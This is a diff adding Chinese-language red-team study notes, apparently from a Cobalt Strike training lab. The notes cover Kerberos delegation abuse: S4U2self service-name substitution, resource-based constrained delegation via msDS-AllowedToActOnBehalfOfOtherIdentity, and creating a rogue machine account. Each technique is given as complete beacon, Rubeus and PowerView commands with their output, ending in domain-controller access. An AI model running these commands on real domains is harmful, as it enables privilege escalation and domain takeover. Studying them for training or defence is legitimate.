@@ -423,6 +423,28 @@ beacon> ls \\wkstn-2\c$
 [-] could not open \\wkstn-2\c$\*: 1326
 ```
 
+## 省略制作kirbi文件步骤的一个方法
+
+创建一个会话，并且把tgt注入，然后steal_token这个会话
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
+
+[*] Using DEV\nlamb:FakePass
+
+[*] Showing process : False
+[*] Username        : nlamb
+[*] Domain          : DEV
+[*] Password        : FakePass
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 5540
+[+] Ticket successfully imported!
+[+] LUID            : 0x3d3194
+
+beacon> steal_token 5540
+```
+
+
 # Alternate Service Name
 
 这个就是约束委派的一个具体例子
@@ -505,6 +527,8 @@ beacon> ls \\dc-2.dev.cyberbotic.io\c$
 
 # S4U2self Abuse
 
+## 情形一，修改服务名
+
 前提：拥有计算机的 RC4、AES256 或 TGT
 
 滥用 S4U2self extension - 如果我们拥有域计算机的 RC4、AES256 或 TGT，则可以访问域计算机
@@ -582,6 +606,75 @@ beacon> ls \\wkstn-2.dev.cyberbotic.io\c$
 ![img](https://img.4hou.com/uploads/20190626/1561541368924891.png)
 
 
+
+## 情形二，知道机器的tgt，但是无法访问
+
+这里假设知道dc-2的tgt
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:DC-2$ /password:FakePass /ticket:doIFuj[...]lDLklP
+
+[*] Using DEV\DC-2$:FakePass
+
+[*] Showing process : False
+[*] Username        : DC-2$
+[*] Domain          : DEV
+[*] Password        : FakePass
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 2832
+[+] Ticket successfully imported!
+[+] LUID            : 0x4d977f
+
+beacon> steal_token 2832
+
+beacon> ls \\dc-2.dev.cyberbotic.io\c$
+[-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
+```
+
+
+利用```self```参数，仿nlamb（也就是DA）请求dc-2的cifs服务的tgs
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'DC-2$@DEV.CYBERBOTIC.IO'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
+[*] Sending S4U2self request to 10.10.122.10:88
+[+] S4U2self success!
+[*] Substituting alternative service name 'cifs/dc-2.dev.cyberbotic.io'
+[*] Got a TGS for 'nlamb' to 'cifs@DEV.CYBERBOTIC.IO'
+[*] base64(ticket.kirbi):
+
+doIFyD[...]MuaW8=
+
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=
+
+[*] Using DEV\nlamb:FakePass
+
+[*] Showing process : False
+[*] Username        : nlamb
+[*] Domain          : DEV
+[*] Password        : FakePass
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 2664
+[+] Ticket successfully imported!
+[+] LUID            : 0x4ff935
+
+beacon> steal_token 2664
+
+beacon> ls \\dc-2.dev.cyberbotic.io\c$
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     08/15/2022 15:44:08   $Recycle.Bin
+          dir     08/10/2022 04:55:17   $WinREAgent
+          dir     08/10/2022 05:05:53   Boot
+          dir     08/18/2021 23:34:55   Documents and Settings
+
+```
+
+
 # Linux Credential Cache
 
 提取域内linux机器的凭据
@@ -639,3 +732,250 @@ beacon> ls \\srv-2\c$
  1b       fil     07/16/2016 13:18:08   BOOTNXT
  256mb    fil     03/09/2021 12:30:35   pagefile.sys
 ```
+
+
+# 基于资源的约束委派（Resource-Based Constrained Delegation）
+
+两个先决条件：
+
+1. A target computer on which you can modify msDS-AllowedToActOnBehalfOfOtherIdentity.（需要一个对目标机器有写入权限的账户GenericAll、GenericWrite、WriteProperty、WriteDacl等等都可以）
+2. Control of another principal that has an SPN.(需要一个SPN账户，因为S4U2Self只适用于具有SPN的账户)
+
+枚举一个有GenericAll、GenericWrite、WriteProperty、WriteDacl权限的组或者用户，然后利用这个用户的本地管理员权限修改msDS-AllowedToActOnBehalfOfOtherIdentity，这样就可以实行资源委派攻击了
+
+
+## 情形一，有对计算机的本地管理员权限
+
+以下查询表明 Developers 组对 DC-2 的所有属性（请参阅 ObjectAceType）具有 WriteProperty 权限
+
+**要注意，这里只是拿DC-2做例子，也有可能是枚举到其他域机器，这种情况就是普通的横向移动，而不是直接拿dc**
+
+```
+beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
+
+AceQualifier           : AccessAllowed
+ObjectDN               : CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
+ActiveDirectoryRights  : Self, WriteProperty
+ObjectAceType          : All
+ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1000
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : InheritedObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1107
+AccessMask             : 40
+AuditFlags             : None
+IsInherited            : True
+AceFlags               : ContainerInherit, Inherited
+InheritedObjectAceType : Computer
+OpaqueLength           : 0
+
+beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
+DEV\Developers
+```
+
+
+查询wkstn-2的sid
+```
+beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
+
+objectsid                                   
+---------                                   
+S-1-5-21-569305411-121244042-2357301523-1109
+```
+
+将在 SDDL 中使用它来创建安全描述符。msDS-AllowedToActOnBehalfOfOtherIdentity 的内容必须是原始二进制格式
+```
+$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
+$rsdb = New-Object byte[] ($rsd.BinaryLength)
+$rsd.GetBinaryForm($rsdb, 0)
+```
+
+在CS里，上面的命令是：
+```
+beacon> powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
+
+Setting 'msDS-AllowedToActOnBehalfOfOtherIdentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 67 233 238 33 138 9 58 7 19 145 129 140 85 4 0 0' for object 'DC-2$'
+
+beacon> powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+
+msds-allowedtoactonbehalfofotheridentity
+----------------------------------------
+{1, 0, 4, 128...}
+```
+
+接下来，我们使用 WKSN-2$ 帐户对 Rubeus 执行 S4U 模拟。该s4u命令需要 TGT、RC4 或 AES 哈希。由于我们已经拥有对它的提升访问权限，我们可以从内存中提取它的 TGT。
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+
+[*] Current LUID    : 0x3e7
+
+ ------------------------------------------------------------------------------------------------------------------ 
+ | LUID     | UserName                     | Service                                       | EndTime              |
+ ------------------------------------------------------------------------------------------------------------------ 
+ | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 9/13/2022 7:27:12 PM |
+
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+
+[*] Target service  : krbtgt
+[*] Target LUID     : 0x3e4
+[*] Current LUID    : 0x3e7
+
+  UserName                 : WKSTN-2$
+  Domain                   : DEV
+  LogonId                  : 0x3e4
+  UserSID                  : S-1-5-20
+  AuthenticationPackage    : Negotiate
+  LogonType                : Service
+  LogonTime                : 9/13/2022 9:26:48 AM
+  LogonServer              : 
+  LogonServerDNSDomain     : 
+  UserPrincipalName        : WKSTN-2$@dev.cyberbotic.io
+
+    ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
+    ServiceRealm             :  DEV.CYBERBOTIC.IO
+    UserName                 :  WKSTN-2$
+    UserRealm                :  DEV.CYBERBOTIC.IO
+    StartTime                :  9/13/2022 9:27:12 AM
+    EndTime                  :  9/13/2022 7:27:12 PM
+    RenewTill                :  9/20/2022 9:27:12 AM
+    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+    KeyType                  :  aes256_cts_hmac_sha1
+    Base64(key)              :  qEQBH1TdRRjZiZ0iXbeCy4Z3MsOf30l8lLTNE4InemY=
+    Base64EncodedTicket   :
+
+doIFuD[...]5JTw==
+```
+
+
+然后使用```s4u```
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap
+
+[*] Building S4U2self request for: 'WKSTN-2$@DEV.CYBERBOTIC.IO'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
+[*] Sending S4U2self request to 10.10.122.10:88
+[+] S4U2self success!
+[*] Got a TGS for 'nlamb' to 'WKSTN-2$@DEV.CYBERBOTIC.IO'
+[*] base64(ticket.kirbi):
+
+      doIFoD[...]0yJA==
+
+[*] Impersonating user 'nlamb' to target SPN 'cifs/dc-2.dev.cyberbotic.io'
+[*] Building S4U2proxy request for service: 'cifs/dc-2.dev.cyberbotic.io'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
+[*] Sending S4U2proxy request to domain controller 10.10.122.10:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io':
+
+      doIGcD[...]MuaW8=
+```
+
+使用上面的tgt，ptt注入会话
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=
+
+[*] Using DEV\nlamb:FakePass
+
+[*] Showing process : False
+[*] Username        : nlamb
+[*] Domain          : DEV
+[*] Password        : FakePass
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 4092
+[+] Ticket successfully imported!
+[+] LUID            : 0x6cb934
+
+beacon> steal_token 4092
+[+] Impersonated DEV\bfarmer
+
+beacon> ls \\dc-2.dev.cyberbotic.io\c$
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     08/15/2022 15:44:08   $Recycle.Bin
+          dir     08/10/2022 04:55:17   $WinREAgent
+          dir     08/10/2022 05:05:53   Boot
+
+```
+
+清楚目标上的 msDS-AllowedToActOnBehalfOfOtherIdentity 条目
+```
+beacon> powershell Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
+```
+
+
+## 情形二，没有对计算机的本地管理员权限
+
+查看可以创建多少个计算机帐户
+```
+beacon> powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota
+
+ms-ds-machineaccountquota
+-------------------------
+                       10
+```
+
+
+1. 使用[StandIn](https://github.com/FuzzySecurity/StandIn)在域里添加一台虚拟的计算机，这里添加一台叫```EvilComputer```的计算机
+
+```
+beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
+
+[?] Using DC    : dc-2.dev.cyberbotic.io
+    |_ Domain   : dev.cyberbotic.io
+    |_ DN       : CN=EvilComputer,CN=Computers,DC=dev,DC=cyberbotic,DC=io
+    |_ Password : oIrpupAtF1YCXaw
+
+[+] Machine account added to AD..
+```
+
+2. 给这台计算加入一个密码，并且列出哈希
+```
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : oIrpupAtF1YCXaw
+[*] Input username             : EvilComputer$
+[*] Input domain               : dev.cyberbotic.io
+[*] Salt                       : DEV.CYBERBOTIC.IOhostevilcomputer.dev.cyberbotic.io
+[*]       rc4_hmac             : 73D0774058830F841C9205C857C9EE62
+[*]       aes128_cts_hmac_sha1 : FB9A1AB8567D4EF4CEA6186A115D091A
+[*]       aes256_cts_hmac_sha1 : 7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
+[*]       des_cbc_md5          : 49B5514F1F45700D
+```
+
+3. 请求机器的tgt
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
+
+[*] Action: Ask TGT
+
+[*] Using aes256_cts_hmac_sha1 hash: 7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
+[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\EvilComputer$'
+[*] Using domain controller: 10.10.122.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIF8j[...]MuaW8=
+
+  ServiceName              :  krbtgt/dev.cyberbotic.io
+  ServiceRealm             :  DEV.CYBERBOTIC.IO
+  UserName                 :  EvilComputer$
+  UserRealm                :  DEV.CYBERBOTIC.IO
+  StartTime                :  9/13/2022 2:31:34 PM
+  EndTime                  :  9/14/2022 12:31:34 AM
+  RenewTill                :  9/20/2022 2:31:34 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  /s6yAyTa1670VNAT9yYBGya/mqOU/YJSLu0XuD2ReBE=
+  ASREP (key)              :  7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
+```
+
+当有了机器的tgt以后，剩下的步骤参考情形一的剩余步骤
